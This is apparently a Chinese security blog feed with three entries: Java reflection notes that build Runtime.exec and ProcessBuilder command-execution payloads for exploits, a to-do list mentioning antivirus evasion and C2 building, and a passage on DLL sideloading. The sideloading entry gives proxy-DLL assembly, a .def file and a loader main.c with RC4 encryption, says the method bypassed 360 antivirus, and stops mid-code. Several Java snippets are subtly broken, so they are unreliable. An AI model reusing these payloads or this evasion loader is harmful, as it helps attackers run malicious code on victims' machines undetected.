&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在编译成.class文件之后，Java会生成C1.class和C1$C2.class这2个文件，使用$作为一个连接符。</p><p>在反射调用(<code>Class.forName</code>)时，我们不能直接搜C2，也不能搜C1.C2，我们要使用编译后的真实名字<code>Class.forName(&quot;com.example.C1$C2&quot;)</code></p><h1 id="TI7RW">反射</h1><h2 id="dFoXm">getMethod</h2><font style="color:rgb(51,51,51);">获得类以后，我们可以继续使用反射来获取这个类中的属性、方法，也可以实例化这个类，并调用方法。</font>`<font style="color:rgb(51,51,51);">class.newInstance()</font>`<font style="color:rgb(51,51,51);">的作用就是调用这个类的无参构造函数，这个比较好理解。不过，我们有时候 在写漏洞利用方法的时候，会发现使用 newInstance 总是不成功，这时候原因可能是： </font><p><font style="color:rgb(51,51,51);">1. 你使用的类没有无参构造函数 </font></p><p><font style="color:rgb(51,51,51);">2. 你使用的类构造函数是私有的</font></p><p>使用getMethod来通过Runtime类的exec执行命令</p><p>Runtime是一个单例模式，他的构造函数是私有的，这意味着我们不能直接用<code>clazz.newInstance()</code>，因为构造函数不让用，只能通过静态方法<code>getRuntime()</code>，让它把造好的唯一对象给你</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Runtime</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Runtime</span> <span class="hljs-variable">currentRuntime</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Runtime</span>();<br>    <br>    <span class="hljs-comment">// 私有构造函数，不让你随便 new</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Runtime</span><span class="hljs-params">()</span> &#123;&#125;<br><br>    <span class="hljs-comment">// 开放了一个静态方法，让你获取那个唯一的对象</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Runtime <span class="hljs-title function_">getRuntime</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> currentRuntime;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再说到exec方法，exec方法是public，不是static，这意味着我们不能用Runtime来执行，要用一个Runtime的对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//错误</span><br>Runtime.exec(<span class="hljs-string">&quot;whoami&quot;</span>)<br><span class="hljs-comment">//正确</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Runtime</span>().exec(<span class="hljs-string">&quot;whoami&quot;</span>)<br></code></pre></td></tr></table></figure><p>那我们的思路就明白了<code>Class.forName</code>拿到clazz -&gt;<code>getMethod</code>拿到<code>getRuntime</code>方法-&gt;invoke执行getRuntime得到一个对象实例-&gt;getMethod拿到exec方法-&gt;invoke对对象实例执行exec方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clazz=Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br>Method getruntime=clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>)<br>Object rt=getruntime.invoke(clazz)<br>Method execmethod=clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class)<br>execmethod.invoke(rt,<span class="hljs-string">&quot;whoami&quot;</span>)<br></code></pre></td></tr></table></figure><p>写成一行就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clazz=Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br>clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class).invoke(<br>    clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="hljs-string">&quot;whoami&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="DBoYf">getContructor</h2>一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类？<p><font style="color:rgb(51,51,51);">可以使用getConstructor。与getMethod类似，getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载， 所以必须用参数列表类型才能唯一确定一个构造函数。 获取到构造函数后，我们使用 newInstance 来执行。</font></p><p>比如另外一种执行命令的方式<code>&lt;font style=&quot;color:rgb(51,51,51);&quot;&gt;ProcessBuilder&lt;/font&gt;</code><font style="color:rgb(51,51,51);">，通过反射获取其构造函数，然后调用start来执行命令</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>((ProcessBuilder)<br>clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="hljs-string">&quot;calc.exe&quot;</span>))).star<br><span class="hljs-title function_">t</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><p><font style="color:rgb(51,51,51);">但是在漏洞环境里面，通常不支持这种写法，或者没引入ProcessBuilder这个类，没法强转，我们需要这样写</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>clazz.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(<br>Arrays.asList(<span class="hljs-string">&quot;calc.exe&quot;</span>)));<br></code></pre></td></tr></table></figure><p><font style="color:rgb(51,51,51);">分开写就是这样</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// === 第一步：获取类 ===</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br><br>        <span class="hljs-comment">// === 第二步：获取构造函数 (解决没有无参构造的问题) ===</span><br>        <span class="hljs-comment">// 对应文本：getConstructor 接收的参数是构造函数列表类型</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getConstructor(List.class);<br><br>        <span class="hljs-comment">// === 第三步：实例化对象 ===</span><br>        <span class="hljs-comment">// 对应文本：获取到构造函数后，我们使用 newInstance 来执行</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">pb</span> <span class="hljs-operator">=</span> constructor.newInstance(Arrays.asList(<span class="hljs-string">&quot;calc.exe&quot;</span>));<br><br>        <span class="hljs-comment">// === 第四步：执行 start 方法 (解决不能强制类型转换的问题) ===</span><br>        <span class="hljs-comment">// 对应文本：通过 getMethod(&quot;start&quot;) 获取到 start 方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">startMethod</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;start&quot;</span>);<br>        <br>        <span class="hljs-comment">// 对应文本：invoke 的第一个参数就是 ProcessBuilder Object 了</span><br>        startMethod.invoke(pb); <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:rgb(51,51,51);">ProcessBuilder有两个构造函数： </font></p><ul><li><code>&lt;font style=&quot;color:rgb(51,51,51);&quot;&gt;public ProcessBuilder(List&lt;String&gt; command) &lt;/font&gt;</code></li><li><code>&lt;font style=&quot;color:rgb(51,51,51);&quot;&gt;public ProcessBuilder(String... command)&lt;/font&gt;</code></li></ul><p>如果我们要用第二个可变长参数(<code>...</code>表示可变长参数)，Java在编译时，会把可变长参数编译成一个数组，所以<code>String[] names</code>和<code>String...names</code>是等价的。所以在反射中，将<code>String[].class</code>传给getConstructor即可获取第二种构造函数。由于newInstance本身接受的参数也是一个数组，二者一叠加，就变成了一个二维数组。举例来说：</p><ul><li><strong>ProcessBuilder</strong> 说：“我要一箱苹果（数组）。”</li><li><strong>newInstance</strong> 说：“所有要传给别人的东西，都必须装在箱子里给我，我会把箱子拆了再给别人。”</li></ul><p>如果你直接给 newInstance <strong>“一箱苹果”</strong>：<br>newInstance 拆开箱子，拿出一个<strong>“苹果”</strong>给 ProcessBuilder。<br>ProcessBuilder 怒了：“我要的是一箱，你给我一个？”</p><p>所以你必须给 newInstance <strong>“一个装了一箱苹果的箱子”</strong>（二维数组）：<br>newInstance 拆开外面的大箱子，拿出里面的<strong>“一箱苹果”</strong>给 ProcessBuilder。<br>ProcessBuilder 开心了。</p><p><font style="color:rgb(51,51,51);">payload如下</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="hljs-keyword">new</span><br><span class="hljs-title class_">String</span>[][]&#123;&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();<br></code></pre></td></tr></table></figure><p><font style="color:rgb(51,51,51);">写成反射就是</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clazz=Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>clazz.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(clazz.getConstructor(<br>    String[].class).newInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[][]&#123;&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;&#125;))<br></code></pre></td></tr></table></figure><h2 id="M6c8y">getDeclared</h2>为了执行一个私有的方法或者构造方法，我们需要用到getDeclared系列的方法。比起getMethod来说：<ul><li><code>getMethod</code>系列方法获取的是当前类中所有公共方法，包括从父类继承的方法</li><li><code>getDeclared</code>系列方法获取当前类中声明的方法，写在这个类里的，包括私有的方法，但是不包含父类里继承的</li></ul><p>因为私有方法或者私有构造函数受到保护，我们需要通过<code>setAccessible(True)</code>来把这个锁给砸开。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clazz=Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>Constructor m=clazz.getDeclaredConstructor();<br>m.setAccessible(True)<br>clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class).invoke(m.newInstance());<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
      <category>javasec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>javasec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>未来展望</title>
    <link href="/%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B/"/>
    <url>/%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B/</url>
    
    <content type="html"><![CDATA[<p>趁现在导师没给我干什么活，也一直没有什么组会，多学一点东西，大学浪费了很多时间，考上研究生后，之前也是一直在玩，这是不可取的，不能再浪费下去了。<br>待做事项：</p><ul><li><input disabled="" type="checkbox"> 进一步学习免杀，包括学习MalDevAcademy课程，以及学习GitHub上的一些免杀技术和项目</li><li><input disabled="" type="checkbox"> 学习java安全（最近开始）</li><li><input disabled="" type="checkbox"> 观看b站上的合集·黑客绝技：创建自己的C2，让你一键getshell（<a href="https://space.bilibili.com/81549960/lists?sid=4517934&amp;spm_id_from=333.788.0.0%EF%BC%89">https://space.bilibili.com/81549960/lists?sid=4517934&amp;spm_id_from=333.788.0.0）</a></li><li><input disabled="" type="checkbox"> 周末的时候挖洞，争取赚到赏金</li><li><input disabled="" type="checkbox"> 尝试编写自己的项目：博客阅读器</li><li><input disabled="" type="checkbox"> 学习代码审计</li><li><input disabled="" type="checkbox"> 打ERTLABS - T&amp;T的红队域渗透靶场</li><li><input disabled="" type="checkbox"> 理财赚钱</li></ul>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>白加黑中如何使白程序正常运行</title>
    <link href="/%E7%99%BD%E5%8A%A0%E9%BB%91%E4%B8%AD%E5%A6%82%E4%BD%95%E4%BD%BF%E7%99%BD%E7%A8%8B%E5%BA%8F%E6%AD%A3%E5%B8%B8%E8%BF%90%E8%A1%8C/"/>
    <url>/%E7%99%BD%E5%8A%A0%E9%BB%91%E4%B8%AD%E5%A6%82%E4%BD%95%E4%BD%BF%E7%99%BD%E7%A8%8B%E5%BA%8F%E6%AD%A3%E5%B8%B8%E8%BF%90%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="白加黑原理"><a href="#白加黑原理" class="headerlink" title="白加黑原理"></a>白加黑原理</h1><p>我们知道白加黑技术的原理是白程序+黑dll，黑dll中包含了一些恶意代码，当白程序运行时，会加载黑dll，从而执行黑dll中的恶意代码。<br>为了高效率学习，直接问gemini3怎么可以让白程序正常运行，不去搜博客技术文章了。<br><img src="https://i.ibb.co/Nd14MrCk/image.png"><br><img src="https://i.ibb.co/rRx29g8s/image.png"><br>我们先来看看原效果(我使用的是用source.def文件导出原dll中的函数，然后统一命名为自定义函数)<br><img src="https://i.ibb.co/sJ3xvKpQ/image.png"><br>绕过了360，但是没办法执行出java版本，而且进程会阻塞住</p><h1 id="链接器指令静态转发"><a href="#链接器指令静态转发" class="headerlink" title="链接器指令静态转发"></a>链接器指令静态转发</h1><p>试过了，被杀软杀烂了，特征太明显了</p><h1 id="基于汇编的动态代理"><a href="#基于汇编的动态代理" class="headerlink" title="基于汇编的动态代理"></a>基于汇编的动态代理</h1><p>跟着gemini3的步骤来<br><img src="https://i.ibb.co/4nWP3Ksr/image.png"><br>具体的汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs asm">.code<br><br>; 声明 C 代码里的全局变量（用来存原函数的真地址）<br>EXTERN pJLI_AddArgsFromEnvVar:QWORD<br>EXTERN pJLI_CmdToArgs:QWORD<br>EXTERN pJLI_GetAppArgIndex:QWORD<br>EXTERN pJLI_GetStdArgc:QWORD<br>EXTERN pJLI_GetStdArgs:QWORD<br>EXTERN pJLI_InitArgProcessing:QWORD<br>EXTERN pJLI_Launch:QWORD<br>EXTERN pJLI_List_add:QWORD<br>EXTERN pJLI_List_new:QWORD<br>EXTERN pJLI_ManifestIterate:QWORD<br>EXTERN pJLI_MemAlloc:QWORD<br>EXTERN pJLI_MemFree:QWORD<br>EXTERN pJLI_PreprocessArg:QWORD<br>EXTERN pJLI_ReportErrorMessage:QWORD<br>EXTERN pJLI_ReportErrorMessageSys:QWORD<br>EXTERN pJLI_ReportExceptionDescription:QWORD<br>EXTERN pJLI_ReportMessage:QWORD<br>EXTERN pJLI_SetTraceLauncher:QWORD<br>EXTERN pJLI_StringDup:QWORD<br><br>; 定义导出函数，收到调用直接飞到真地址去<br>JLI_AddArgsFromEnvVar PROC<br>    jmp pJLI_AddArgsFromEnvVar<br>JLI_AddArgsFromEnvVar ENDP<br><br>JLI_CmdToArgs PROC<br>    jmp pJLI_CmdToArgs<br>JLI_CmdToArgs ENDP<br><br>JLI_GetAppArgIndex PROC<br>    jmp pJLI_GetAppArgIndex<br>JLI_GetAppArgIndex ENDP<br><br>JLI_GetStdArgc PROC<br>    jmp pJLI_GetStdArgc<br>JLI_GetStdArgc ENDP<br><br>JLI_GetStdArgs PROC<br>    jmp pJLI_GetStdArgs<br>JLI_GetStdArgs ENDP<br><br>JLI_InitArgProcessing PROC<br>    jmp pJLI_InitArgProcessing<br>JLI_InitArgProcessing ENDP<br><br>JLI_Launch PROC<br>    jmp pJLI_Launch<br>JLI_Launch ENDP<br><br>JLI_List_add PROC<br>    jmp pJLI_List_add<br>JLI_List_add ENDP<br><br>JLI_List_new PROC<br>    jmp pJLI_List_new<br>JLI_List_new ENDP<br><br>JLI_ManifestIterate PROC<br>    jmp pJLI_ManifestIterate<br>JLI_ManifestIterate ENDP<br><br>JLI_MemAlloc PROC<br>    jmp pJLI_MemAlloc<br>JLI_MemAlloc ENDP<br><br>JLI_MemFree PROC<br>    jmp pJLI_MemFree<br>JLI_MemFree ENDP<br><br>JLI_PreprocessArg PROC<br>    jmp pJLI_PreprocessArg<br>JLI_PreprocessArg ENDP<br><br>JLI_ReportErrorMessage PROC<br>    jmp pJLI_ReportErrorMessage<br>JLI_ReportErrorMessage ENDP<br><br>JLI_ReportErrorMessageSys PROC<br>    jmp pJLI_ReportErrorMessageSys<br>JLI_ReportErrorMessageSys ENDP<br><br>JLI_ReportExceptionDescription PROC<br>    jmp pJLI_ReportExceptionDescription<br>JLI_ReportExceptionDescription ENDP<br><br>JLI_ReportMessage PROC<br>    jmp pJLI_ReportMessage<br>JLI_ReportMessage ENDP<br><br>JLI_SetTraceLauncher PROC<br>    jmp pJLI_SetTraceLauncher<br>JLI_SetTraceLauncher ENDP<br><br>JLI_StringDup PROC<br>    jmp pJLI_StringDup<br>JLI_StringDup ENDP<br><br>END<br></code></pre></td></tr></table></figure><p>然后是导出定义<br><img src="https://i.ibb.co/pv4fc2VT/image.png"></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">LIBRARY <span class="hljs-string">&quot;jli.dll&quot;</span><br>EXPORTS<br><span class="hljs-keyword">JLI_AddArgsFromEnvVar</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_CmdToArgs</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_GetAppArgIndex</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_GetStdArgc</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_GetStdArgs</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_InitArgProcessing</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_Launch</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_List_add</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_List_new</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_ManifestIterate</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_MemAlloc</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_MemFree</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_PreprocessArg</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_ReportErrorMessage</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_ReportErrorMessageSys</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_ReportExceptionDescription</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_ReportMessage</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_SetTraceLauncher</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_StringDup</span><br></code></pre></td></tr></table></figure><p>然后是main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;rc4.h&quot;</span> <span class="hljs-comment">// 你的加密头文件</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-comment">// 1. 定义全局指针（给 ASM 用）</span><br>UINT_PTR pJLI_AddArgsFromEnvVar = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_CmdToArgs = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_GetAppArgIndex = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_GetStdArgc = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_GetStdArgs = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_InitArgProcessing = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_Launch = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_List_add = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_List_new = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_ManifestIterate = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_MemAlloc = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_MemFree = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_PreprocessArg = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_ReportErrorMessage = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_ReportErrorMessageSys = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_ReportExceptionDescription = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_ReportMessage = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_SetTraceLauncher = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_StringDup = <span class="hljs-number">0</span>;<br><br>HMODULE hOrg = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// 2. 初始化代理函数：加载原DLL并获取地址</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">SetupProxies</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (hOrg) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// 加载被改名的原DLL</span><br>    hOrg = LoadLibrary(<span class="hljs-string">L&quot;test.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!hOrg) <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">// 获取真实地址并赋值给全局变量</span><br>    pJLI_AddArgsFromEnvVar = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_AddArgsFromEnvVar&quot;</span>);<br>    pJLI_CmdToArgs = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_CmdToArgs&quot;</span>);<br>    pJLI_GetAppArgIndex = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_GetAppArgIndex&quot;</span>);<br>    pJLI_GetStdArgc = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_GetStdArgc&quot;</span>);<br>    pJLI_GetStdArgs = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_GetStdArgs&quot;</span>);<br>    pJLI_InitArgProcessing = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_InitArgProcessing&quot;</span>);<br>    pJLI_Launch = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_Launch&quot;</span>);<br>    pJLI_List_add = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_List_add&quot;</span>);<br>    pJLI_List_new = (UINT_PTR)GetProcAddress(hOrg, <span 